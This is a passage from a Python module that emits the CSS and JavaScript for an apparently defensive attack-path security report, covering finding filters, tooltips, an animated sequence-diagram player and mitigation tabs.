.seq-mtab-pane p{margin:0 0 8px;font-size:13px;line-height:1.65;color:var(--text-secondary)}
.seq-mit-list{margin:4px 0 0;padding-left:18px;font-size:12.5px;line-height:1.7}
.seq-mit-list li{margin-bottom:6px;color:var(--text-secondary)}
.seq-mit-list li code{font-family:var(--font-mono);font-size:11px;background:var(--code-bg);color:var(--primary);padding:1px 5px;border-radius:3px}
.seq-mit-list a{color:var(--primary);text-decoration:underline}
.seq-mit-tier{display:inline-block;padding:2px 9px;border-radius:11px;font-size:9px;font-weight:700;text-transform:uppercase;letter-spacing:.5px;color:#fff}
.seq-mit-tier.urgent{background:#D13438}
.seq-mit-tier.soon{background:#F7630C}
.seq-mit-tier.long{background:#107C10}
.seq-mit-code{background:var(--code-bg);padding:10px 12px;border-radius:6px;font-family:var(--font-mono);font-size:11px;line-height:1.55;color:var(--text);overflow-x:auto;white-space:pre-wrap;word-break:break-word;border:1px solid var(--border);max-height:160px;overflow-y:auto}
.seq-copy-btn{margin-left:auto;background:var(--bg-card);border:1px solid var(--border);color:var(--text-secondary);font-size:10px;font-weight:600;padding:3px 9px;border-radius:4px;cursor:pointer;font-family:var(--font-primary)}
.seq-copy-btn:hover{background:var(--primary);color:#fff;border-color:var(--primary)}

/* Portal link */
.portal-link{display:inline-block;padding:4px 10px;background:rgba(0,120,212,0.08);color:var(--primary);border-radius:4px;font-size:12px;text-decoration:none;margin:6px 0}
.portal-link:hover{background:rgba(0,120,212,0.15)}

/* Detail table */
.detail-table{width:100%;border-collapse:collapse;margin:8px 0;font-size:13px}
.detail-table td{padding:6px 10px;border-bottom:1px solid var(--border-light)}
.detail-key{font-weight:600;width:140px;color:var(--text-secondary)}
.path-details{margin:8px 0}
.path-details summary{cursor:pointer;color:var(--primary);font-size:12px;font-weight:500}
.seq-details{margin:8px 0}
.seq-details summary{cursor:pointer;color:var(--primary);font-size:12px;font-weight:600}

/* Remediation */
.remediation{margin:12px 0 0;padding:14px;background:var(--remediation-bg);border-left:4px solid var(--remediation-border);border-radius:0 8px 8px 0}
.rem-text{font-size:13px;margin-bottom:8px;color:var(--text)}
.rem-cmd{margin:8px 0}
.rem-cmd strong{font-size:11px;text-transform:uppercase;color:var(--text-secondary);letter-spacing:.5px}
.rem-cmd pre{margin:4px 0;padding:8px 12px;background:var(--code-bg);border:1px solid var(--code-border);border-radius:6px;overflow-x:auto}
.rem-cmd code{font-family:var(--font-mono);font-size:12px;color:var(--primary)}
.rem-link{margin-top:8px}
.rem-link a{color:var(--primary);text-decoration:none;font-size:13px}
.rem-link a:hover{text-decoration:underline}

/* MITRE link */
.mitre-link{color:var(--primary);text-decoration:none;font-family:var(--font-mono);font-weight:600}
.mitre-link:hover{text-decoration:underline}

/* Type section */
.type-count{font-weight:400;color:var(--text-muted);font-size:14px}

/* Filter bar */
.filter-bar{display:flex;gap:12px;flex-wrap:wrap;margin-bottom:20px;padding:16px;background:var(--bg-card);border:1px solid var(--border);border-radius:10px;align-items:flex-end}
.filter-group{display:flex;flex-direction:column;gap:4px}
.filter-group label{font-size:11px;font-weight:600;color:var(--text-muted);text-transform:uppercase;letter-spacing:.3px}
.filter-input{flex:1;min-width:200px;padding:8px 14px;background:var(--bg);border:1px solid var(--border);border-radius:6px;color:var(--text);font-size:13px;font-family:var(--font-primary)}
.filter-group:first-child{flex:1;min-width:200px}
.filter-input:focus{border-color:var(--primary);outline:none;box-shadow:0 0 0 2px rgba(0,120,212,0.2)}
.filter-select{padding:8px 12px;background:var(--bg);border:1px solid var(--border);border-radius:6px;color:var(--text);font-size:13px;font-family:var(--font-primary);cursor:pointer}
.filter-select:focus{border-color:var(--primary);outline:none}
.result-count{font-size:12px;color:var(--text-muted);align-self:center}

/* Show more */
.show-more-btn{display:block;width:100%;padding:12px;background:var(--bg-card);border:1px solid var(--border);border-radius:8px;color:var(--primary);font-size:14px;font-weight:600;cursor:pointer;text-align:center;transition:all .2s}
.show-more-btn:hover{background:var(--bg-card-hover);border-color:var(--primary)}

/* Error list */
.error-list{list-style:none;padding:0}
.error-list li{padding:8px 12px;background:var(--bg-subtle);border-left:3px solid var(--warning);margin-bottom:4px;border-radius:0 4px 4px 0;font-size:13px}
.error-list code{font-family:var(--font-mono);color:var(--primary)}

/* Heatmap container */
.heatmap-container{padding:8px}

/* ── Section Explainer Boxes ───────────────────────────── */
.section-explainer{display:flex;gap:12px;padding:16px 20px;background:linear-gradient(135deg,rgba(0,120,212,.05),rgba(107,63,160,.05));border:1px solid rgba(0,120,212,.12);border-radius:10px;margin:12px 0 20px;font-size:13px;line-height:1.7;color:var(--text-secondary)}
.section-explainer-icon{font-size:18px;flex-shrink:0;margin-top:1px}
.section-explainer-body{flex:1}
.section-explainer-title{font-size:12px;font-weight:700;color:var(--text);margin:0 0 4px;text-transform:uppercase;letter-spacing:.4px}
.section-explainer p{margin:4px 0}

/* ── Attack Surface Summary ────────────────────────────── */
.attack-surface-summary{padding:16px 20px;background:linear-gradient(135deg,rgba(209,52,56,.04),rgba(255,140,0,.04));border:1px solid rgba(209,52,56,.12);border-radius:10px;margin:16px 0;font-size:13px;line-height:1.8;color:var(--text-secondary)}
.attack-surface-summary h4{font-size:14px;color:var(--text);margin:0 0 10px}
.attack-surface-summary p{margin:8px 0}

/* ── Exploitation Analysis ─────────────────────────────── */
.exploitation-analysis{margin:12px 0;border:1px solid var(--border);border-radius:8px;overflow:hidden}
.exploitation-analysis summary{cursor:pointer;color:var(--primary);font-size:13px;font-weight:600;padding:10px 14px;background:var(--bg-card);transition:background .2s}
.exploitation-analysis summary:hover{background:var(--bg-elevated)}
.ea-content{padding:16px;background:var(--bg-subtle);border-top:1px solid var(--border)}
.ea-mitre{font-size:12px;color:var(--text-muted);margin-bottom:12px;padding:6px 10px;background:rgba(0,120,212,.06);border-radius:4px;display:inline-block}
.ea-section{margin-bottom:16px}
.ea-section h5{font-size:13px;font-weight:700;color:var(--text);margin:0 0 10px;text-transform:uppercase;letter-spacing:.3px;border-bottom:1px solid var(--border);padding-bottom:6px}
.ea-steps{display:flex;flex-direction:column;gap:8px}
.ea-step{display:flex;gap:10px;align-items:flex-start;padding:8px 12px;background:var(--bg-card);border:1px solid var(--border);border-radius:6px;font-size:12px;line-height:1.5}
.ea-step-num{width:24px;height:24px;border-radius:50%;background:var(--primary);color:#fff;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:700;flex-shrink:0}
.ea-step-desc{color:var(--text-secondary);font-size:11px}
.ea-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:12px}
.ea-card{padding:12px;background:var(--bg-card);border:1px solid var(--border);border-radius:8px}
.ea-card h6{font-size:11px;font-weight:700;color:var(--text);margin:0 0 6px;text-transform:uppercase;letter-spacing:.3px}
.ea-card p{font-size:12px;color:var(--text-secondary);margin:0 0 4px;line-height:1.5}
.ea-meta{font-size:11px;color:var(--text-muted);font-family:var(--font-mono)}
.ea-indicators{margin:0;padding-left:16px;font-size:11px;color:var(--text-secondary);line-height:1.6}
@media(max-width:768px){.ea-grid{grid-template-columns:1fr}}

/* ── WCAG badge contrast overrides ─────────────────────── */
.badge[style*="FFB900"]{color:#1A1600!important}
.badge[style*="6B6B6B"]{color:#1A1A1A!important}

/* ── Animations ────────────────────────────────────────── */
@keyframes apFadeIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
.finding-card{animation:apFadeIn .3s ease both}
.finding-card:nth-child(2){animation-delay:.05s}
.finding-card:nth-child(3){animation-delay:.1s}
.finding-card:nth-child(4){animation-delay:.15s}
.finding-card:nth-child(5){animation-delay:.2s}
.finding-card:nth-child(6){animation-delay:.25s}
.finding-card:nth-child(7){animation-delay:.3s}
.finding-card:nth-child(8){animation-delay:.35s}
.stat-card{animation:apFadeIn .4s ease both}
.stat-card:nth-child(1){animation-delay:.05s}
.stat-card:nth-child(2){animation-delay:.1s}
.stat-card:nth-child(3){animation-delay:.15s}
.stat-card:nth-child(4){animation-delay:.2s}
.stat-card:nth-child(5){animation-delay:.25s}
.stat-card:nth-child(6){animation-delay:.3s}
.stat-card:nth-child(7){animation-delay:.35s}
.stat-card:nth-child(8){animation-delay:.4s}
.top-finding-row{animation:apFadeIn .3s ease both}
.top-finding-row:nth-child(2){animation-delay:.1s}
.top-finding-row:nth-child(3){animation-delay:.2s}
.top-finding-row:nth-child(4){animation-delay:.3s}
.top-finding-row:nth-child(5){animation-delay:.4s}

/* ── Print overrides ───────────────────────────────────── */
@media print{
  .filter-bar,.pagination,.show-more-btn,.zoom-controls,.seq-play-bar,.seq-explain-col,.back-to-top{display:none!important}
  .finding-card{page-break-inside:avoid;animation:none!important}
  .chain-container svg,.heatmap-container svg{max-width:100%!important}
  .seq-diagram .seq-msg{opacity:1!important;transform:none!important}
  .fw-popup,.fw-backdrop,#ciq-tooltip,.seq-modal,.seq-modal-overlay{display:none!important}
  body{background:#fff;color:#000;font-size:12px}
  .badge{border:1px solid #333;print-color-adjust:exact;-webkit-print-color-adjust:exact}
}
@media(prefers-reduced-motion:reduce){
  .finding-card,.stat-card,.top-finding-row,.seq-msg,.fw-open .fw-ctrl,.fw-open .fw-section-hdr{animation:none!important;transition:none!important}
  .seq-arrow-line{animation:none!important}
}
"""


# ── Report JS ─────────────────────────────────────────────────────────

def _report_js() -> str:
    """Attack-path-specific JavaScript: filter/search/pagination, sequence diagram engine,
    tooltip engine, compliance popups, zoom controls, keyboard nav, scroll spy."""
    return """
// ── Filter / Search / Sort ──
(function(){
  var PAGE_SIZE = 15;
  var showing = PAGE_SIZE;
  var cards = Array.from(document.querySelectorAll('.finding-card'));
  var searchInput = document.getElementById('search-input');
  var sevFilter = document.getElementById('severity-filter');
  var typeFilter = document.getElementById('type-filter');
  var sortSelect = document.getElementById('sort-select');
  var resultCount = document.getElementById('result-count');
  var showMoreBtn = document.getElementById('show-more-btn');
  var types = {};
  cards.forEach(function(c){ types[c.dataset.type] = 1; });
  Object.keys(types).sort().forEach(function(t){
    var o = document.createElement('option');
    o.value = t;
    o.textContent = t.replace(/_/g,' ').replace(/\\b\\w/g,function(l){return l.toUpperCase();});
    if(typeFilter) typeFilter.appendChild(o);
  });
  function applyFilters(){
    var query = (searchInput&&searchInput.value||'').toLowerCase();
    var sev = sevFilter?sevFilter.value:'';
    var type = typeFilter?typeFilter.value:'';
    var visible = [];
    cards.forEach(function(c){
      var show = true;
      if(sev && c.dataset.severity !== sev) show = false;
      if(type && c.dataset.type !== type) show = false;
      if(query && c.textContent.toLowerCase().indexOf(query) === -1) show = false;
      c.style.display = show ? '' : 'none';
      if(show) visible.push(c);
    });
    var sort = sortSelect?sortSelect.value:'score-desc';
    var parent = visible[0] && visible[0].parentNode;
    if(parent && visible.length > 1){
      var sevOrder = {critical:0,high:1,medium:2,low:3,informational:4};
      visible.sort(function(a,b){
        if(sort==='score-desc') return (parseInt(b.dataset.score)||0) - (parseInt(a.dataset.score)||0);
        if(sort==='score-asc') return (parseInt(a.dataset.score)||0) - (parseInt(b.dataset.score)||0);
        if(sort==='severity') return (sevOrder[a.dataset.severity]||4) - (sevOrder[b.dataset.severity]||4);
        if(sort==='type') return (a.dataset.type||'').localeCompare(b.dataset.type||'');
        return 0;
      });
      visible.forEach(function(c){ parent.appendChild(c); });
    }
    showing = PAGE_SIZE;
    applyPagination(visible);
    if(resultCount) resultCount.textContent = visible.length + ' of ' + cards.length + ' paths';
  }
  function applyPagination(visible){
    visible.forEach(function(c,i){ c.style.display = i < showing ? '' : 'none'; });
    if(showMoreBtn) showMoreBtn.style.display = visible.length > showing ? '' : 'none';
  }
  if(searchInput) searchInput.addEventListener('input', applyFilters);
  if(sevFilter) sevFilter.addEventListener('change', applyFilters);
  if(typeFilter) typeFilter.addEventListener('change', applyFilters);
  if(sortSelect) sortSelect.addEventListener('change', applyFilters);
  if(showMoreBtn) showMoreBtn.addEventListener('click', function(){
    showing += PAGE_SIZE;
    var visible = cards.filter(function(c){ return c.style.display !== 'none'; });
    applyPagination(visible.length ? visible : cards);
  });
  if(resultCount) resultCount.textContent = cards.length + ' paths';
})();

// ── Keyboard Navigation ──
document.addEventListener('keydown', function(e){
  if(e.target.tagName === 'INPUT' || e.target.tagName === 'SELECT' || e.target.tagName === 'TEXTAREA') return;
  var cards = Array.from(document.querySelectorAll('.finding-card:not([style*="display: none"])'));
  if(!cards.length) return;
  var focused = document.activeElement;
  var idx = cards.indexOf(focused);
  if(e.key === 'ArrowDown' || e.key === 'j'){
    e.preventDefault();
    cards[idx < cards.length - 1 ? idx + 1 : 0].focus();
  } else if(e.key === 'ArrowUp' || e.key === 'k'){
    e.preventDefault();
    cards[idx > 0 ? idx - 1 : cards.length - 1].focus();
  } else if(e.key === 'Enter' && idx >= 0){
    var det = cards[idx].querySelector('details');
    if(det) det.open = !det.open;
  }
});

// ── Back to top ──
(function(){
  var btn = document.querySelector('.back-to-top');
  if(!btn) return;
  window.addEventListener('scroll', function(){
    btn.classList.toggle('visible', window.scrollY > 400);
  });
  btn.addEventListener('click', function(){ window.scrollTo({top:0,behavior:'smooth'}); });
})();

// ── Sidebar active state on scroll ──
(function(){
  var sections = document.querySelectorAll('.section[id]');
  var navLinks = document.querySelectorAll('.sidebar nav a');
  if(!sections.length || !navLinks.length) return;
  var observer = new IntersectionObserver(function(entries){
    entries.forEach(function(entry){
      if(entry.isIntersecting){
        navLinks.forEach(function(l){ l.classList.remove('active'); l.removeAttribute('aria-current'); });
        var link = document.querySelector('.sidebar nav a[href="#' + entry.target.id + '"]');
        if(link){ link.classList.add('active'); link.setAttribute('aria-current','true'); }
      }
    });
  }, {rootMargin:'-20% 0px -60% 0px'});
  sections.forEach(function(s){ observer.observe(s); });
})();

// ── Zoom Controls ──
var _zoomLevel = 100;
function zoomIn(){ _zoomLevel = Math.min(_zoomLevel + 10, 150); _applyZoom(); }
function zoomOut(){ _zoomLevel = Math.max(_zoomLevel - 10, 70); _applyZoom(); }
function zoomReset(){ _zoomLevel = 100; _applyZoom(); }
function _applyZoom(){
  // Target the actual main content container. Use transform:scale for cross-browser
  // reliability (the legacy `zoom` property is non-standard and was the original bug —
  // selector was '.content' which does not exist in this document).
  var c = document.getElementById('main-content') || document.querySelector('main') || document.body;
  if(c){
    var s = (_zoomLevel / 100);
    c.style.transformOrigin = 'top left';
    c.style.transform = (s === 1) ? '' : 'scale(' + s + ')';
    // Compensate width so horizontal scrollbar tracks the scaled content correctly.
    c.style.width = (s === 1) ? '' : (100 / s) + '%';
  }
  var lbl = document.getElementById('zoom-label');
  if(lbl) lbl.textContent = _zoomLevel + '%';
}

// ── Compliance Popup ──
// Reparent the popup + backdrop to <body> on open. This escapes any ancestor with
// transform/filter/will-change which would otherwise (a) trap position:fixed inside
// the ancestor and (b) apply the ancestor's filter to the popup, making it look blurred.
function openCompliancePopup(id){
  var popup = document.getElementById(id);
  var bd = document.getElementById('fw-backdrop');
  if(!popup) return;
  if(popup.parentNode !== document.body) document.body.appendChild(popup);
  if(bd && bd.parentNode !== document.body) document.body.appendChild(bd);
  popup.style.display='flex'; popup.classList.add('fw-open');
  if(bd) bd.classList.add('fw-show');
  document.body.style.overflow='hidden';
}
function closeCompliancePopup(id){
  var popup = document.getElementById(id);
  var bd = document.getElementById('fw-backdrop');
  if(popup){ popup.style.display='none'; popup.classList.remove('fw-open'); }
  if(bd) bd.classList.remove('fw-show');
  document.body.style.overflow='';
}
(function(){
  var bd = document.getElementById('fw-backdrop');
  if(bd) bd.addEventListener('click', function(){
    bd.classList.remove('fw-show');
    document.querySelectorAll('.fw-popup').forEach(function(p){ p.style.display='none'; p.classList.remove('fw-open'); });
    document.body.style.overflow='';
  });
  // ESC key closes any open framework popup
  document.addEventListener('keydown', function(ev){
    if(ev.key === 'Escape'){
      var anyOpen = document.querySelector('.fw-popup.fw-open');
      if(anyOpen){
        anyOpen.style.display='none'; anyOpen.classList.remove('fw-open');
        if(bd) bd.classList.remove('fw-show');
        document.body.style.overflow='';
      }
    }
  });
})();

// ── Tooltip Engine (viewport-aware) ──
(function(){
  var tip = document.getElementById('ciq-tooltip');
  if(!tip) return;
  var GAP=10, MARGIN=12;
  function show(ev){
    var tgt = ev.target.closest('[data-tip]');
    if(!tgt) return;
    var text = tgt.getAttribute('data-tip');
    if(!text) return;
    var d = document.createElement('span'); d.textContent = text; var safe = d.innerHTML;
    safe = safe.replace(/\\nYOUR TENANT:/g,'<span class="t-sep">Your Tenant</span>');
    safe = safe.replace(/\\n/g,'<br>');
    tip.innerHTML = safe;
    tip.classList.add('visible');
    requestAnimationFrame(function(){
      var r = tgt.getBoundingClientRect();
      var tw = tip.offsetWidth, th = tip.offsetHeight;
      var vw = window.innerWidth, vh = window.innerHeight;
      var above = r.top - GAP - th;
      var below = r.bottom + GAP;
      var top, arrow;
      if(above >= MARGIN){ top = above; arrow = 'arrow-bottom'; }
      else if(below + th <= vh - MARGIN){ top = below; arrow = 'arrow-top'; }
      else { top = Math.max(MARGIN, vh - th - MARGIN); arrow = ''; }
      var left = r.left + r.width/2 - tw/2;
      left = Math.max(MARGIN, Math.min(left, vw - tw - MARGIN));
      var arrowX = r.left + r.width/2 - left;
      arrowX = Math.max(16, Math.min(arrowX, tw - 16));
      tip.style.top = top + 'px';
      tip.style.left = left + 'px';
      tip.style.setProperty('--arrow-x', arrowX + 'px');
      tip.className = 'visible' + (arrow ? ' ' + arrow : '');
    });
  }
  function hide(){ tip.classList.remove('visible'); tip.className = ''; }
  document.addEventListener('mouseenter', show, true);
  document.addEventListener('mouseleave', function(ev){ if(ev.target.closest('[data-tip]')) hide(); }, true);
  document.addEventListener('focusin', show, true);
  document.addEventListener('focusout', function(ev){ if(ev.target.closest('[data-tip]')) hide(); }, true);
})();

// ── Animated Sequence Diagram Engine ──
(function(){
  var diagrams = document.querySelectorAll('.seq-diagram');
  diagrams.forEach(function(container){
    var scriptEl = container.querySelector('script.seq-config');
    if(!scriptEl) return;
    var cfg;
    try { cfg = JSON.parse(scriptEl.textContent); } catch(e){ return; }
    var actors = cfg.actors || [];
    var steps = cfg.steps || [];
    if(!actors.length || !steps.length) return;
    container.innerHTML = '';
    // Play bar
    var bar = document.createElement('div'); bar.className = 'seq-play-bar';
    var btnPrev = _mkBtn('\\u25C0 Prev','seq-prev');
    var btnPlay = _mkBtn('\\u25B6 Play','seq-play');
    var btnNext = _mkBtn('Next \\u25B6','seq-next');
    var btnReset = _mkBtn('\\u27F2 Reset','seq-reset');
    var btnAll = _mkBtn('Show All','seq-showall');
    var indicator = document.createElement('span'); indicator.className = 'seq-step-indicator'; indicator.textContent = '0 / ' + steps.length;
    [btnPrev,btnPlay,btnNext,btnReset,btnAll,indicator].forEach(function(b){bar.appendChild(b);});
    container.appendChild(bar);
    // Body
    var body = document.createElement('div'); body.className = 'seq-body';
    var main = document.createElement('div'); main.className = 'seq-main';
    var explainCol = document.createElement('div'); explainCol.className = 'seq-explain-col';
    body.appendChild(main); body.appendChild(explainCol);
    container.appendChild(body);
    // Actors
    var actorsRow = document.createElement('div'); actorsRow.className = 'seq-actors';
    var actorBoxes = [];
    actors.forEach(function(a){
      var wrap = document.createElement('div'); wrap.className = 'seq-actor';
      var box = document.createElement('div'); box.className = 'seq-actor-box'; box.style.borderColor = a.color;
      var ic = document.createElement('span'); ic.className = 'seq-actor-icon'; ic.textContent = a.icon;
      var nm = document.createElement('span'); nm.className = 'seq-actor-name'; nm.textContent = a.name;
      var tg = document.createElement('span'); tg.className = 'seq-actor-tag'; tg.style.background = a.color; tg.textContent = a.type;
      box.appendChild(ic); box.appendChild(nm); box.appendChild(tg);
      wrap.appendChild(box); actorsRow.appendChild(wrap); actorBoxes.push(box);
    });
    main.appendChild(actorsRow);
    // Lifelines
    var lifeArea = document.createElement('div'); lifeArea.className = 'seq-lifelines';
    lifeArea.style.minHeight = (steps.length * 56 + 20) + 'px';
    actors.forEach(function(a,i){
      var ll = document.createElement('div'); ll.className = 'seq-lifeline';
      ll.style.left = ((i + 0.5) / actors.length * 100) + '%';
      lifeArea.appendChild(ll);
    });
    main.appendChild(lifeArea);
    // Messages
    var msgsWrap = document.createElement('div'); msgsWrap.className = 'seq-messages';
    var msgEls = [], explainEls = [];
    steps.forEach(function(step,si){
      var row = document.createElement('div'); row.className = 'seq-msg'; row.dataset.step = si;
      var num = document.createElement('span'); num.className = 'seq-msg-num'; num.textContent = (si+1);
      var aw = document.createElement('div'); aw.className = 'seq-arrow-wrap';
      var al = document.createElement('div'); al.className = 'seq-arrow-line'; al.style.color = step.color;
      var ah = document.createElement('div'); ah.className = 'seq-arrow-head'; ah.style.color = step.color;
      var lb = document.createElement('span'); lb.className = 'seq-arrow-label'; lb.textContent = step.label;
      if(step.mitre){ var mt = document.createElement('span'); mt.className = 'seq-mitre-tag'; mt.textContent = step.mitre; aw.appendChild(mt); }
      aw.appendChild(al); aw.appendChild(ah); aw.appendChild(lb);
      row.appendChild(num); row.appendChild(aw);
      row.addEventListener('click', function(){ goTo(si); });
      msgsWrap.appendChild(row); msgEls.push(row);
      // Explain — rich card with WHY / HOW / TOOLS / API / PERM / MITRE / DETECT / PREREQ
      var exp = document.createElement('div'); exp.className = 'seq-explain'; exp.id = container.id + '-exp-' + si;
      exp.innerHTML =
        '<div><span class="seq-e-num">' + (si+1) + '</span><span class="seq-e-title">' + _escH(step.title) + '</span></div>' +
        '<div class="seq-e-flow"><strong>' + _escH(actors[step.from].name) + '</strong> \\u2192 <strong>' + _escH(actors[step.to].name) + '</strong></div>' +
        _seqRichRows(step) +
        '<button class="seq-details-btn" onclick="_seqShowDetail(this)">More Details\\u2026</button>';
      try { exp.dataset.step = JSON.stringify(step); } catch(e){}
      explainCol.appendChild(exp); explainEls.push(exp);
    });
    main.appendChild(msgsWrap);
    // State
    var current = -1, playing = false, timer = null, showAllMode = false;
    function goTo(idx){ showAllMode = false; current = Math.max(-1, Math.min(idx, steps.length-1)); render(); }
    function render(){
      // Clamp current so we never index out of bounds during transitions
      var safeCur = (current >= 0 && current < steps.length) ? current : -1;
      indicator.textContent = (current+1) + ' / ' + steps.length;
      msgEls.forEach(function(el,i){
        el.classList.toggle('visible', i <= current || showAllMode);
        el.classList.toggle('active', i === safeCur && !showAllMode);
        var line = el.querySelector('.seq-arrow-line');
        if(line) line.classList.toggle('animated', i === safeCur && !showAllMode);
      });
      explainEls.forEach(function(el,i){ el.classList.toggle('active', i === safeCur && !showAllMode); });
      actorBoxes.forEach(function(box,i){
        var isActive = safeCur >= 0 && !showAllMode && (steps[safeCur].from === i || steps[safeCur].to === i);
        box.classList.toggle('active', isActive);
        box.style.borderColor = isActive ? steps[safeCur].color : actors[i].color;
      });
      btnPlay.textContent = playing ? '\\u23F8 Pause' : '\\u25B6 Play';
      if(showAllMode){
        indicator.textContent = 'All ' + steps.length + ' steps';
        explainCol.innerHTML = '';
        var allDiv = document.createElement('div'); allDiv.className = 'seq-explain-all';
        steps.forEach(function(step,si){
          var card = document.createElement('div'); card.className = 'seq-ea-card';
          card.innerHTML = '<span class="seq-e-num">' + (si+1) + '</span>' +
            '<span class="seq-ea-title">' + _escH(step.title) + '</span>' +
            '<div class="seq-ea-flow"><strong>' + _escH(actors[step.from].name) + '</strong> \u2192 <strong>' + _escH(actors[step.to].name) + '</strong></div>' +
            _seqRichRows(step) +
            '<button class="seq-details-btn" onclick="_seqShowDetailFromCard(this)">More Details\u2026</button>';
          try { card.dataset.step = JSON.stringify(step); } catch(e){}
          card.dataset.stepIdx = si;
          allDiv.appendChild(card);
        });
        explainCol.appendChild(allDiv);
      } else {
        explainCol.innerHTML = '';
        explainEls.forEach(function(el){ explainCol.appendChild(el); });
      }
    }
    function play(){
      if(playing){ stopPlay(); return; }
      // Leaving "Show All" or restarting after end-of-play → go back to step 0
      if(showAllMode || current >= steps.length - 1){ showAllMode = false; current = -1; }
      playing = true;
      timer = setInterval(function(){
        var next = current + 1;
        if(next >= steps.length){
          // End of playback: stop the interval first, then transition state cleanly,
          // then render exactly once with valid in-bounds state.
          if(timer){ clearInterval(timer); timer = null; }
          playing = false;
          current = steps.length - 1;
          showAllMode = true;
          msgEls.forEach(function(el){ el.classList.add('visible'); });
          render();
          return;
        }
        current = next;
        render();
      }, 1200);
      render();
    }
    function stopPlay(){ playing = false; if(timer){ clearInterval(timer); timer = null; } render(); }
    function fullReset(){
      // Hard reset: stop playback, clear all visual state, restore initial markup.
      if(timer){ clearInterval(timer); timer = null; }
      playing = false;
      showAllMode = false;
      current = -1;
      msgEls.forEach(function(el){
        el.classList.remove('visible'); el.classList.remove('active');
        var line = el.querySelector('.seq-arrow-line');
        if(line) line.classList.remove('animated');
      });
      explainEls.forEach(function(el){ el.classList.remove('active'); });
      actorBoxes.forEach(function(box,i){
        box.classList.remove('active');
        box.style.borderColor = actors[i].color;
      });
      // Make sure the right column is back to the original explainEls (Show All may have replaced it)
      explainCol.innerHTML = '';
      explainEls.forEach(function(el){ explainCol.appendChild(el); });
      indicator.textContent = '0 / ' + steps.length;
      btnPlay.textContent = '\\u25B6 Play';
    }
    btnPrev.addEventListener('click', function(){ stopPlay(); goTo(current-1); });
    btnPlay.addEventListener('click', play);
    btnNext.addEventListener('click', function(){ stopPlay(); goTo(current+1); });
    btnReset.addEventListener('click', fullReset);
    btnAll.addEventListener('click', function(){ stopPlay(); showAllMode = true; current = steps.length-1; msgEls.forEach(function(el){el.classList.add('visible');}); render(); });
    render();
  });
  function _mkBtn(txt,cls){ var b = document.createElement('button'); b.className = 'seq-btn '+cls; b.textContent = txt; return b; }
  function _escH(s){ var d = document.createElement('span'); d.textContent = s||''; return d.innerHTML; }
  // Build the WHY/HOW/TOOLS/API/PERM/MITRE/DETECT/PREREQ rows for a step.
  function _seqRichRows(step){
    var rows = [
      ['why', 'Why',  step.why  || step.desc || ''],
      ['how', 'How',  step.how  || ''],
      ['tools','Tools', step.tools || ''],
      ['api', 'API',  step.api  || ''],
      ['perm','Perm', step.permission || ''],
      ['mitre','MITRE',step.mitre || ''],
      ['detect','Detect',step.detection || ''],
      ['prereq','Prereq',step.prereq || '']
    ];
    var html = '<div class="seq-rich">';
    for(var i=0;i<rows.length;i++){
      var r = rows[i];
      if(!r[2]) continue;
      var cls = r[0];
      html += '<div class="seq-rich-row"><span class="seq-rich-lbl '+cls+'">'+r[1]+'</span><span class="seq-rich-val '+cls+'">'+_escH(r[2])+'</span></div>';
    }
    html += '</div>';
    return html;
  }
  // expose for modal
  window._seqRichRows = _seqRichRows;
  window._seqEscH = _escH;
})();

// ── Sequence Detail Modal — 3-tab: Executive / Technical / Mitigation ──
function _seqEscModal(s){ var d=document.createElement('span'); d.textContent=s||''; return d.innerHTML; }
function _seqRenderExecTab(step){
  var html = '<div class="seq-mtab-pane">';
  html += '<div class="seq-mtab-section"><div class="seq-mtab-h">What is happening</div><p>' + _seqEscModal(step.summary || step.why || step.desc || '') + '</p></div>';
  if(step.business_impact){
    html += '<div class="seq-mtab-section"><div class="seq-mtab-h">Business impact &amp; cost</div><p>' + _seqEscModal(step.business_impact) + '</p></div>';
  }
  if(step.real_world){
    html += '<div class="seq-mtab-section"><div class="seq-mtab-h">Real-world precedent</div><p>' + _seqEscModal(step.real_world) + '</p></div>';
  }
  if(step.mitre){
    html += '<div class="seq-mtab-section"><div class="seq-mtab-h">MITRE ATT&amp;CK technique</div><p><code>' + _seqEscModal(step.mitre) + '</code></p></div>';
  }
  html += '</div>';
  return html;
}
function _seqRenderTechTab(step){
  // Re-use the rich rows renderer (8 chips) for consistency with the side card.
  return '<div class="seq-mtab-pane">' + (window._seqRichRows ? window._seqRichRows(step) : '') + '</div>';
}
function _seqMitList(arr){
  if(!arr || !arr.length) return '';
  var out = '<ul class="seq-mit-list">';
  for(var i=0;i<arr.length;i++) out += '<li>' + _seqEscModal(arr[i]) + '</li>';
  out += '</ul>';
  return out;
}
function _seqCopy(btn, val){
  try {
    if(navigator.clipboard) navigator.clipboard.writeText(val);
    else { var ta=document.createElement('textarea'); ta.value=val; document.body.appendChild(ta); ta.select(); document.execCommand('copy'); document.body.removeChild(ta); }
    var orig = btn.textContent; btn.textContent = '✓ Copied'; setTimeout(function(){ btn.textContent = orig; }, 1500);
  } catch(e){}
}
function _seqRenderMitTab(step){
  var html = '<div class="seq-mtab-pane">';
  if(step.mitigation_now && step.mitigation_now.length){
    html += '<div class="seq-mtab-section"><div class="seq-mtab-h"><span class="seq-mit-tier urgent">Immediate (today)</span></div>' + _seqMitList(step.mitigation_now) + '</div>';
  }
  if(step.mitigation_soon && step.mitigation_soon.length){
    html += '<div class="seq-mtab-section"><div class="seq-mtab-h"><span class="seq-mit-tier soon">Short-term (this week)</span></div>' + _seqMitList(step.mitigation_soon) + '</div>';
  }
  if(step.mitigation_long && step.mitigation_long.length){
    html += '<div class="seq-mtab-section"><div class="seq-mtab-h"><span class="seq-mit-tier long">Long-term (architectural)</span></div>' + _seqMitList(step.mitigation_long) + '</div>';
  }
  if(step.verify_query){
    var safeQ = step.verify_query.replace(/'/g,"\\'").replace(/\\n/g,' ');
    html += '<div class="seq-mtab-section"><div class="seq-mtab-h">Verification query (Sentinel KQL / Graph)' +
      ' <button class="seq-copy-btn" onclick="_seqCopy(this, this.nextElementSibling.textContent)">Copy</button></div>' +
      '<pre class="seq-mit-code">' + _seqEscModal(step.verify_query) + '</pre></div>';
  }
  if(step.references && step.references.length){
    html += '<div class="seq-mtab-section"><div class="seq-mtab-h">Authoritative references</div><ul class="seq-mit-list">';
    for(var i=0;i<step.references.length;i++){
      var r = step.references[i];
      html += '<li><a href="' + _seqEscModal(r.url) + '" target="_blank" rel="noopener">' + _seqEscModal(r.title) + '</a> &mdash; <code>' + _seqEscModal(r.url) + '</code></li>';
    }
    html += '</ul></div>';
  }
